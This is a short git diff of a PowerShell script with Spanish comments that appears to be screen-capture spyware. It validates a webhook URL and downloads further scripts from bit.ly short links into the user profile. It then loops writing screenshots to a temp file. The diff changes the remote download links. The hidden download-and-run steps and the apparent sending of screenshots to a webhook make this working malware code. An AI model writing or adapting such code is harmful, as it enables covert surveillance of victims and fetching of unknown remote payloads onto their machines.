@@ -10,13 +10,13 @@ if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!..." ; 
 $syswPath = "$env:USERPROFILE\sysw.ps1"
 if (!(Test-Path $syswPath)) {
     # Descargar el script principal
-    $syswUrl = "https://bit.ly/Screen_dc"
+    $syswUrl = "https://bit.ly/3HVDrbb"
     Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
 }
 
 # Descargar el nuevo archivo
 $newFilePath = "$env:USERPROFILE\newFile.ps1"
-Invoke-WebRequest -Uri "https://bit.ly/3SDV1W2" -OutFile $newFilePath
+Invoke-WebRequest -Uri "https://bit.ly/3HVDrbb" -OutFile $newFilePath
 
 do {
     $Filett = "$env:temp\SC.png"
